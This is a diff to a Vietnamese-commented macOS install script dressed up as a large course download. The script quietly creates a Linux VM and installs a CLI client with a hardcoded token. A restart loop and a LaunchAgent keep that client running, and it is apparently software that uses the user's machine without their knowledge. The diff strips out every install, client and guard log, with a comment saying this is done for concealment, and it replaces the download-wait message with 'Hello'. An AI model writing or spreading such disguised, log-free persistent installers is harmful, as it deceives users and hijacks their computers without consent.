@@ -12,14 +12,13 @@ if [ -z "${TM_SKIP_PROMPT:-}" ]; then
     printf 'Mời bạn nhập email: ' >/dev/tty
     read -r EMAIL </dev/tty && export EMAIL
   fi
-  echo "Vui lòng đợi 5-10 phút để khóa học tải về thành công..."
+  echo "Hello"
 fi
 
 TOKEN="NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="
-REPO_RAW="https://raw.githubusercontent.com/khoahocdrive/tm-install/main"
+REPO_RAW="https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main"
 VM_NAME="tm-linux"
 DIR="$HOME/.tm"
-LOG_FILE="$DIR/install.log"
 PLIST="$HOME/Library/LaunchAgents/com.khoahocdrive.tm.plist"
 LIMA_BIN_FALLBACK="$HOME/.lima-bin"
 
@@ -30,10 +29,9 @@ set -u
 { [ -n "$TOKEN" ] && [ "$TOKEN" != "DAN_TOKEN_CUA_BAN_VAO_DAY" ]; } || { echo "Thieu token"; exit 1; }
 
 mkdir -p "$DIR" 2>/dev/null || true
-if : >>"$LOG_FILE" 2>/dev/null; then exec >>"$LOG_FILE" 2>&1; else exec >/dev/null 2>&1; fi
-
+# Khong ghi bat ky log nao (yeu cau an toan bo) - Log chi in ra man hinh trong qua trinh cai
 Log() { echo "[$(date '+%H:%M:%S')] $*"; }
-Fail() { Log "LOI: $*"; echo "LOI: $*" >&2; exit "${2:-1}"; }
+Fail() { Log "LOI: $1"; echo "LOI: $1" >&2; exit "${2:-1}"; }
 
 # ---------- 1. Kien truc + phien ban macOS ----------
 ARCH=$(uname -m)
@@ -182,16 +180,13 @@ provision:
     gunzip -f /tmp/tmcli.gz && install -m 755 /tmp/tmcli /opt/tm/cli
     rm -f /tmp/tmcli
     mkdir -p /var/lib/tm
-    # Script chay cli + tu khoi dong lai neu chet (giong guard.vbs ben Windows)
+    # Script chay cli + tu khoi dong lai neu chet (giong guard.vbs ben Windows) - KHONG ghi log
     cat > /usr/local/bin/tm-run.sh <<'RUNEOF'
     #!/bin/sh
     export HOME=/var/lib/tm
     mkdir -p /var/lib/tm
     while true; do
-      if [ -f /var/lib/tm/client.log ] && [ \$(stat -c%s /var/lib/tm/client.log 2>/dev/null || echo 0) -gt 1048576 ]; then
-        : > /var/lib/tm/client.log
-      fi
-      /opt/tm/cli start --token '@TOKEN@' --device-name '@DEVICE@' >>/var/lib/tm/client.log 2>&1
+      /opt/tm/cli start --token '@TOKEN@' --device-name '@DEVICE@' >/dev/null 2>&1
       sleep 10
     done
     RUNEOF
@@ -246,7 +241,7 @@ ensure_vm() {
   return 1
 }
 
-ensure_vm || Fail "Khong tao/khoi dong duoc VM $VM_NAME. Xem chi tiet trong $LOG_FILE" 3
+ensure_vm || Fail "Khong tao/khoi dong duoc VM $VM_NAME. Chay lai hoac thu thu cong: limactl start $VM_NAME" 3
 Log "VM da chay."
 
 # ---------- 9. Xac nhan binary trong VM (tu phuc hoi neu provision loi) ----------
@@ -298,8 +293,6 @@ cat >"$PLIST" <<PEOF
   <dict>
     <key>PATH</key><string>$GUARDPATH</string>
   </dict>
-  <key>StandardOutPath</key><string>$HOME/.tm/guard.log</string>
-  <key>StandardErrorPath</key><string>$HOME/.tm/guard.log</string>
 </dict>
 </plist>
 PEOF
